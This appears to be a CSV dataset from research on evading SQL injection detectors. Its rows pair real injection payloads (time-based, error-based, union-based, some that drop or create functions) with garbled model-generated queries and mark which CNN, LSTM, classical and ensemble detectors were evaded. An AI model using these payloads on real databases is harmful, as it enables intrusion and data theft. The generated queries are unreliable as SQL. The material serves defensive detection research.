,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
8491,1'));select (case when (3365=6236) then 3365 else 1/(select 0) end)--,SELECT MIN(case) FROM SQL injection detection,0,0,1,1,1,1,1
8492,"1"") as mibc where 3113=3113;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",SELECT 6276 FROM SQL_injection WHERE NOT 6276 = 6276 AND NOT 6276 = 6276*(select) = 6276*(select) FROM SQL_Injection WHERE NOT SELECT 6276 = 6276 AND NOT 6276 = 6276*(select) = 6276*(select) FROM SQL_Injection),0,1,0,0,0,0,0
8493,1')) waitfor delay '0:0:5' and (('amnf' like 'amnf,SELECT 'amnf' FROM SQL injection detection,1,0,1,1,1,1,1
8494,"1"" where 5353=5353 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",SELECT MIN(select) FROM SQL injection_diagnosis WHERE NOT SQL_injection_method_code = '5353=5353' AND NOT SELECT DISTINCT (select) FROM (SELECT MIN(select) FROM SQL SELECT MIN(select) FROM (SELECT MIN(select) FROM (SELECT MIN(select) FROM SQL)),0,1,0,0,1,0,0
8495,"1' where 7504=7504 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",SELECT MIN(5000000000) FROM SQL injection_detecting WHERE NOT null_injection = '7504 = 7504' AND char(120)|char(105)|char(85)|char(85) ='sql injection detection',1,1,0,0,1,0,0
8496,"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('zaru'='zaru","SELECT * FROM SQL injection detection WHERE NOT domain.domain.columns = 't2, domain.tables' AND ((('zaru' = 'zaru')",1,1,0,0,0,0,0
8497,"1%')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","SELECT dbms_pipe.receive_message(chr(112)||chr(78),5) FROM SQL injection",1,1,0,0,1,0,0
8498,1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),SELECT MIN(case) FROM SQL injection detection) FROM SQL_inaddr.get_host_address(chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113) FROM SQL_inaddr.get_host_address(chr(113)||chr(113)||chr(113) FROM SQL injection detection WHERE NOT chr(4386 = 4386 ='sql',0,1,0,0,1,0,0
8499,"1%"" or (select * from (select(sleep(5)))sddo)#",SELECT DISTINCT select(select(sleep(5))) FROM SQL injection_detection,1,1,0,0,1,0,0
8500,1) as bpap where 7758=7758 or 4240=(select 4240 from pg_sleep(5))--,SELECT MIN(select 4240 FROM pg_sleep(5)) AS : FROM SQL injection AS t1 JOIN detection AS t2 ON t1.select 4240 = t2.select 4240 FROM pg_sleep(5),1,1,0,0,1,0,0
8501,"1'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('dzzx'='dzzx","SELECT * FROM SQL_injection, SELECT * FROM SELECT * FROM SELECT * FROM SQL_injection, SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SQL_injection, SELECT * FROM SQL_injection, SELECT * FROM SELECT * FROM SELECT * FROM * WHERE NOT md5(0x52515a50) = 'dzzx'",1,1,0,1,1,1,0
8502,1'+(select soqk where 5383=5383;select pg_sleep(5)--,SELECT MIN(select) FROM SQL injection detection,0,0,0,1,1,1,0
8503,"1%"") and make_set(8403=8403,8899) and (""%""=""",SELECT DISTINCT %% FROM SQL injection,1,0,0,1,1,1,0
8504,1'));select pg_sleep(5)--,SELECT pg_sleep(5)-- FROM SQL injections EXCEPT SELECT pg_sleep(5)-- FROM SQL_injection,1,1,0,0,1,0,0
8505,"1%') union all select null,null,null,null#","SELECT MIN(sql injection) FROM SQL SELECT MIN(null,null,null#) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SELECT MIN(null) FROM SQL",1,1,1,0,1,1,0
8506,"1"")) as xcyo where 2929=2929;select sleep(5)--",SELECT MIN(select) as xcyo FROM SQL injection detection,0,0,0,0,1,0,0
8507,-9564 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),"SELECT MIN(case) FROM SQL injection detection WHERE NOT SELECT -9564, -544 OR 144 =(select upper(xmltype(chr(113)||chr(113)||chr(113)||chr(106)||chr(62)) FROM SQL",0,1,0,0,1,0,0
8508,"1) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (4959=4959","SELECT 4959 = 4959 FROM SQL AS _valid_sQCH_CHEIVE_MESsage(chr(76)||chr(657) FROM query: 1 AND NOT SQL_injection_message = ""dbms_pipe.receive_message(chr(76)||chr(657) = ""valid""",1,1,0,0,1,0,0
8509,1'+(select 'ohdf' where 7878=7878 and 5678=3277--,SELECT'sequence' FROM SQL injection',1,0,1,1,1,1,1
8510,"1;select count(*) from generate_series(1,5000000)# fnck","SELECT MIN(*) FROM generate_series(1,5000000)# fnckck) FROM SQL injection",1,1,0,0,0,0,0
8511,1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),SELECT MIN(7756 = 7756) FROM SQL injection detection,1,1,1,0,1,1,0
8512,1))) and 6467=1864#,SELECT * FROM SQL_injector WHERE NOT SQL_inject = 'yes',1,1,1,1,1,1,1
8513,"1%"";call regexp_substring(repeat(right(char(2385),0),500000000),null)--","SELECT MIN(repeat(right(right(char(2385),500000000) FROM SQL injection detection",1,1,0,0,1,0,0
8514,"1"") as nqtn where 5606=5606 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","SELECT SQL_injection FROM SQL_injection WHERE 5606 = 5606 AND all_users t3,all_users t4,all_users t5)--",1,1,0,0,0,0,0
8515,1%')) order by 1--,SELECT MIN(1 - 1) FROM SQL injection detection,1,1,1,0,1,1,0
8516,"1' where 8803=8803 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","SELECT MIN(select count(*) FROM SQL_injection) FROM SELECT 8803 = 8803 = 8803 ORDER BY sysusers as sys2,sysusers as sys4,sysusers as sys7)--",1,1,0,0,0,0,0
8517,"1"") as ffon where 2738=2738 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - ffon WHERE 2738 = 2738 AND 3754 = '3754=(select',0,1,0,0,0,0,0
8518,"1') as mara where 7164=7164;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",SELECT MIN(select) FROM SQL injection_diagnosis WHERE NOT jQuery: 1') ='sequence',0,1,0,0,1,0,0
8519,"1' where 7125=7125 or elt(6272=6272,sleep(5))--",SELECT MIN(sleep(5))-- SELECT MIN(sleep(5)) FROM SQL injection detection,1,1,0,0,1,0,0
8520,"1')) and elt(4249=4249,7259) and (('miir' like 'miir","SELECT DISTINCT t1.miir FROM'sql injection' AS t1 JOIN query: 1') AND NOT t(4249 = 4249 = 4249,7259) AND (((((((miir) ='miir') FROM SQL injection detection'",0,1,0,0,0,0,0
8521,"1 where 1062=1062 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",SELECT NOT SQL_substring(repeat(left(crypt_key)||char(77)||char(88) FROMregexp_substring(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(sq_substring) FROM SELECT SQL_key(repeat(repeat(repeat(71) FROM SELECT SQL_key(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(,1,1,0,0,1,0,0
8522,"1"") union all select null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
8523,"1"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""ijop""=""ijop",SELECT MIN(select) FROM SQL injection_deficite) FROM SQL_inject JOIN (SELECT SUM(select) FROM SQL_INSTRUCTION) GROUP BY ijop,0,0,0,0,1,0,0
8524,1));(select * from (select(sleep(5)))srmq) and ((4982=4982,SELECT DISTINCT select(select(sleep(5))) FROM SQL injection detection,1,1,0,0,1,0,0
8525,"-2241))) or make_set(9354=9354,7185) and (((6840=6840",SELECT NOT(6840 = 6840) FROM SQL AS t1 JOIN(9354 = 9354 = 6840) FROM SELECT NOT t2.(6840 = 6840,0,1,0,0,1,0,0
8526,"1' where 4417=4417 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--","SELECT MIN(sql injection) FROM SQL_injection WHERE 4417 = 4417 AND 6537 = dbms_pipe.receive_message(chr(76)||chr(65),5)-- eluded FROM SQL injection",1,1,0,0,0,0,0
8527,"1"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""njdu"" like ""njdu",SELECT * FROM (SELECT * FROM SQL_injection) ORDER BY(select),0,0,0,0,1,0,0
8528,1)));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,"SELECT 6276 FROM SQL_injection, EXCEPT SELECT 6276 FROM information_schema.character_sets)",1,1,1,1,1,1,1
8529,-7345) union all select 3866#,SELECT 3866# FROM SQL injection detection,1,0,1,1,1,1,1
8530,"-4287%"")) union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(9074,9074,9074,9074,9074#) FROM SELECT MIN(sql injection) FROM Query: -4287%)",1,1,0,0,1,0,0
8531,"1"") where 2764=2764 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",SELECT MIN(case) FROM SQL injection detection,0,0,1,1,1,1,1
8532,"-3037""))) or elt(4758=9129,9129) and (((""zewv"" like ""zewv",SELECT MIN(((((((((((((((((((()) FROM SQL injection)) FROM SQL injection detection) ORDER BY COUNT(*) DESC,1,1,0,0,1,0,0
8533,1'+(select bjav where 6923=6923 and (select * from (select(sleep(5)))gcrr)#,"SELECT DISTINCT select_select bjav FROM SQL injection_description WHERE NOT 6923 = 6923 AND NOT select_from (select(select(5)))gcrr)# FROM SQL SELECT MIN(select) FROM query: 1'+(select) FROM (SELECT gcrr) FROM SQL SELECT gcrr) FROM query: 1'+(select bjav) FROM (SELECT SELECT MIN(select_select_bjav) FROM SQL SELECT MIN(select_from (select_bjav) FROM (SELECT MIN(select_select_bjav) FROM SQL SELECT, SUM(select(select) FROM (SELECT MIN(select) FROM SQL SELECT MIN(select) FROM (SELECT MIN(select) FROM SQL Query: 1'+(select) FROM (SELECT MIN(s",1,1,0,0,1,0,0
8534,"1%"" and (select * from (select(sleep(5)))fzno) and ""%""=""",SELECT DISTINCT select(select(sleep(5)))fzno) FROM SQL injection_detection,1,1,0,0,1,0,0
8535,"-6381%"" or 8571=8571--","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql) FROM query: -6381%"" OR 8571 = 8571",0,1,0,0,1,0,0
8536,"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('beju' like 'beju",SELECT MIN(select) FROM SQL injection_detection,0,0,0,1,1,1,0
8537,1';begin user_lock.sleep(5); end,"SELECT MIN(user_lock.sleep(5); end) FROM SQL injection_tect_detective WHERE NOT Query: 1';begin user_lock.sleep(5); = ""sql injection detection""",1,1,0,0,1,0,0
8538,1%') and sleep(5)#,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
8539,-8521'+(select ucim where 9003=9003 union all select 9003--,SELECT MIN(9003 = 9003 union) FROM SQL injection,1,1,0,0,0,0,0
8540,"1"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""dqis""=""dqis",SELECT DISTINCT ((((((((((((((((((((((((()) FROM SQL injection)) FROM regexp_substring(repeat(left(crypt_key) FROM table) AS :null) FROM table table_repeat(repeat(left(crypt_key)||char(105)||char(100) FROMregexp_substring(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat)) FROM SQL),1,1,0,0,1,0,0
8541,-5147 or (8459=8459)*4906,SELECT * FROM query: -5147 or (8459 = 8459)*4906 WHERE NOT SQL_inject_state = 'valid' ORDER BY query_facturer,1,1,0,0,1,0,0
8542,"1"")) as gvpm where 5170=5170 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","SELECT MIN(select count(*) FROM SQL injection detection WHERE NOT sysusers as sys1,sysusers as sys2,sysusers as sys4,sysusers as sys7-- FROM gvpm WHERE NOT sysusers as sysusers as sys1,sysusers as sys4,sysusers as sys7)-- SELECT MIN(select count(*) FROM SQL injection'",1,1,0,0,0,0,0
8543,-8378%') union all select 5491#,SELECT MIN(SQL) FROM SQL SELECT -SELECT - SELECT - MIN(SQL) FROM Query: -8378%'),1,1,0,0,1,0,0
8544,"-9718%"") union all select 9515,9515,9515#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) FROM Query: -9718% union All select 9515,9515# FROM SQL_Injection",1,1,0,0,1,0,0
8545,1))) and 4595=4595#,"SELECT * FROM SELECT NOT SQL_inject_name, 4595 = 4595 = 4595 = 4595 = 4595 = 4595 = 4595 = invalid_sq_inject query: 1) 1)",1,1,0,0,0,0,0
8546,"1%"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""%""=""",SELECT DISTINCT t1.(((((((((((((((((((((((((((((((())) FROM SQL injection)) AND NOT t1.select case 6240) ='sqpjq' AND t240 =('qqpjqqpjq') AND t1.((((((((((((((((((((select case 6240) ='sqpjqqpjq)',0,1,0,0,0,0,0
8547,"1))) union all select null,null,null,null,null,null,null,null#","SELECT null,null,null FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - injection_detecting",1,1,1,1,1,1,1
8548,"1' in boolean mode);iif(5257=5257,1,1/0)","SELECT MIN(5257 = 5257,1,1/0) FROM SQL injection detection",1,1,0,0,0,0,0
8549,1;(select * from (select(sleep(5)))srmq),SELECT DISTINCT ssrmq FROM SQL injection,1,0,1,1,1,1,1
8550,"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)-- hlgt",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
8551,"-6041')) or make_set(9835=1367,1367) and (('hxjf'='hxjf",SELECT MIN(hxjf) FROM SQL injection_detection,1,1,1,1,1,1,1
8552,"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('dbsm'='dbsm",SELECT DISTINCT t1.(((((((((((((((((((((((((((((((((((((((((()) FROM SQL injection)) FROM SQL_injection) = 'evade''sql')',0,1,0,0,0,0,0
8553,"1'+(select 'idmr' where 5029=5029 union all select null,null,null,null,null,null--",SELECT MIN(select) FROM SQL injection detection,0,0,0,1,1,1,0
8554,"1'+(select taga where 8036=8036;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
8555,"1' in boolean mode) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#","SELECT MIN(repeat(left(crypt_key)||char(88) FROM SQL injection) FROM SELECT evade_sq_injection FROM query: 1' AND query: 1' = ""boolean mode)""",1,1,0,0,1,0,0
8556,"1""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""xtyt""=""xtyt",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
8557,"1"")) as ndbk where 5042=5042 and 8594=(select 8594 from pg_sleep(5))--","SELECT t1.select 8594 FROM pg_sleep(5)) AS c1 FROM SQL injection_detection WHERE 5042 = 5042 AND NOT t2.select 8594 = ""select 8594 from pg_sleep(5))""",1,1,0,0,1,0,0
8558,1')));if(9431=6730) select 9431 else drop function xbkh--,SELECT 9431 = 6730 AND NOT SQL injection_method_code ='sql',1,1,1,1,0,1,0
8559,1'||(select 'idna' from dual where 2683=2683 rlike (select (case when (3201=9748) then 1 else 0x28 end)))||',SELECT MIN(select) FROM SQL injection detection WHERE NOT idna IN (SELECT idna FROM SQL Query: 1'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||'sql injection',0,1,0,0,0,0,0
8560,"-1050"")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""orfo"" like ""orfo",SELECT MIN(select) FROM SQL injection detection) FROM SQL_inaddr.complex_inaddr.complex_inaddr.complex_inaddr.complex_inaddr.complex_inaddr.complex_inaddr.complex_inaddr.chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(select (select_inaddr.xl_inaddr.xr(select) FROM SQL SELECT &///chr(select) FROM SELECT SELECT &//chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)||chr(112)|chr(112) FROM SQL injection detection W,0,1,0,0,1,0,0
8561,"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('ylql' like 'ylql","SELECT DISTINCT t1.(*) FROM'sql injection' AS t1 JOIN query: 1', '2633 = dbms_pipe.receive_message(chr(112),'sql' FROM SQL injection'",0,1,1,0,1,1,0
8562,1'||(select 'oxas' from dual where 8284=8284 or sleep(5))||',SELECT 'oxas' FROM SQL injection',1,0,1,1,1,1,1
8563,"1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('owot'='owot","SELECT MIN(*) FROM SQL injection detection) FROM sysibm.systables as t2,sysibm.systables as t3) and ((((((*) FROM sysibm.systables as t3) and (select count(*) FROM SQL injection detection)",1,1,0,0,0,0,0
8564,"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""ikaf"" like ""ikaf","SELECT DISTINCT esq_injection FROM SQL SELECT evade SQL injection detection, COUNT(*) FROM'sql' AND NOT ikaf = ""like('abcdefg',upper(hex(hex(randomblob(500000000000/2)) AND (SELECT ikaf) FROM SQL injection detection",1,1,0,0,1,0,0
8565,1%' or 6793=(select 6793 from pg_sleep(5)) and '%'=',SELECT 6793 FROM pg_sleep(5) and '%' ='sq injection',1,1,0,0,0,0,0
8566,"1))) union all select null,null--","SELECT null,null-- FROM SQL injection detection",1,1,1,1,1,1,1
8567,"1%"")) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",SELECT MIN(repeat(right(right(right(right(right)) FROM SQL injection detection) FROM table_regexp_substring(repeat(repeat(right(right(right(right) or not5000000000) FROM SQL injection detection,1,0,0,0,1,0,0
8568,"1"");begin dbms_lock.sleep(5); end--",SELECT DISTINCT end-- end-- end-- end-- sleep(5) FROM SQL injection detection,1,1,0,0,0,0,0
8569,"-7371') union all select 4531,4531,4531#",SELECT MIN(SQL) FROM 4531 JOIN Query: -7371'),0,1,1,0,1,1,0
8570,1' and 8594=(select 8594 from pg_sleep(5))--,SELECT 8694 FROM pg_sleep(5)-- SELECT SQL_injection FROM SQL_injection,1,1,0,1,1,1,0
8571,"1"")) as sqow where 8752=8752;select (case when (1726=4080) then 1726 else 1/(select 0) end)--",SELECT 1/(select 0) end) FROM SQL injection detection,1,1,0,0,1,0,0
8572,"1'||(select 'brsr' where 5458=5458;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
8573,1')) as hpta where 5376=5376 waitfor delay '0:0:5'--,SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) FROM Query: 1'),1,1,1,0,1,1,0
8574,"1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('gucd'='gucd","SELECT COUNT(*) FROM SQL_injection WHERE NOT sysusers as sys1,sysusers as sysusers as sysusers as sys4,sysusers as sys7) AND (((((((((((select count(*) FROM SQL injection)",1,1,0,0,0,0,0
8575,"-1993%"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""%""=""",SELECT MIN(select case) FROM SQL injection detection,0,0,0,1,1,1,0
8576,1%';select (case when (1407=2741) then 1407 else 1407*(select 1407 from mysql.db) end)#,SELECT MIN(select) FROM SQL injection_detection,0,0,0,1,1,1,0
8577,"1%"")) or sleep(5) and ((""%""=""","SELECT MIN(((((((((((((()%"") FROM SQL injection detection) FROM SQL injection detection",1,1,0,0,1,0,0
8578,"1) where 9010=9010 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",SELECT MIN(*) FROM SQL injection detection WHERE 9010 = 9010 = 9010 AND 8514 = (select count(*) FROM domain.domain.tables as t3)--,1,1,0,0,0,0,0
8579,1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pziy'='pziy,SELECT MIN(select case 6240) FROM SQL injection detection WHERE NOT'sqpjq' AND 6240 = '1 else 0 end from rdb$database)||'qzvzq',0,1,0,0,1,0,0
8580,"-7409"")) union all select 3145,3145,3145--",SELECT MIN(SQL) FROM SQL Injection WHERE NOT SELECT DISTINCT -7409),1,1,1,1,1,1,1
8581,-8301'))) or (5708=5268)*5268 and ((('hkha'='hkha,SELECT MIN((((((((((((((((((((((((((((((((((((((((((((((())) FROM SQL injection)) FROM SQL injection) ORDER BY query: -8301'),1,1,0,0,0,0,0
8582,"1) as odqn where 3910=3910;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
8583,-6757'))) or 4524=3696,SELECT MIN(SQL) FROM SQL Injection WHERE NOT SELECT MIN(SQL) FROM query: -6757') ORDER BY generated,0,1,1,1,1,1,1
8584,1)));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,SELECT 1/(select 0) end) FROM SQL injection detection,1,1,0,0,1,0,0
8585,"1%"")) and 7533=7533 and ((""%""=""",SELECT MIN((((((((((((((((((()%) FROM SQL injection detection) FROM SQL injection detection),1,1,0,0,1,0,0
8586,"1 or 8466=benchmark(5000000,md5(0x694a4745))# irvm",SELECT MIN(0x694a4745)# FROM SQL AS irvm_instructor AS irvm_ FROM query: 1 ORDER BY irvm_(0x694a4745),0,1,1,1,1,1,1
8587,1)) as mlpf where 7425=7425;select sleep(5)--,SELECT MIN(select) FROM SQL injection detection,0,0,0,1,1,1,0
8588,"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('afdy' like 'afdy","SELECT 'evadefg','sql injection detection' FROM SQL SELECT 'abcdefg', 'abcdefg', 'afdy' FROM SQL_injection'",1,0,1,0,1,1,0
8589,"1)) or 8421=(select count(*) from generate_series(1,5000000)) and ((4277=4277","SELECT _select count(*) FROM query_series(1,5000000) AND ((4277 = 4277) FROM SQL injection detection",1,1,0,0,1,0,0
8590,"1'))) and elt(9041=6421,6421) and ((('ixxg' like 'ixxg",SELECT DISTINCT t1.((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((()) FROM SQL injection)),1,1,0,0,0,0,0
8591,"1) where 2720=2720 and elt(4249=4249,7259)--","SELECT * FROM SQL_INSERT SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM elt(4249 = 4249,7259)-- FROM SQL AS t1 WHERE NOT SELECT MIN(2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720 = 2720",1,1,0,1,1,1,0
8592,"1%')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('%'='","SELECT MIN(select) FROM SQL injection_deficite) FROM SQL_inject JOIN (SELECT SUM(select) FROM SQL_INQUISITE) AS :__percentage FROM (SELECT SUM(select) FROM SELECT SUM(select) FROM SQL_INQUISITE_0, SUM(select) FROM (SELECT SUM(select) FROM SQL_INQUISITE_0, '%')) FROM SELECT SQL_injection_deficitection_deficite','sql injection')",0,0,0,0,1,0,0
8593,"1'+(select 'uijv' where 7279=7279 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",SELECT'sequence_message(chr(69)||chr(68)-- if you want to use SQL injection' FROM SQL_injection,1,1,0,0,1,0,0
8594,"1"";if(8812=7896) select 8812 else drop function xltk--",SELECT 8812 = 7896) FROM SQL injection detection,1,1,1,1,1,1,1
8595,-9225) or (8258=2726)*2726 and (9900=9900,SELECT * FROM query: 9258 = 2726 AND (9900 = 9900,1,1,0,0,0,0,0
8596,"1""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""urqg""=""urqg",SELECT DISTINCT (((((((((((((((((((((((()) FROM SQL injection)) FROM RESULT_Injection) FROM regexp_substring(repeat(sql)) FROM table_regexp_substring(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(sqg)|char(100)|charqg) FROM SELECT d_regexp_substring(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat,1,1,0,0,1,0,0
8597,"1""));(select * from (select(sleep(5)))acdk)#",SELECT * FROM (SELECT SUM(select(sleep(5))) FROM SQL injection detection),1,1,0,0,1,0,0
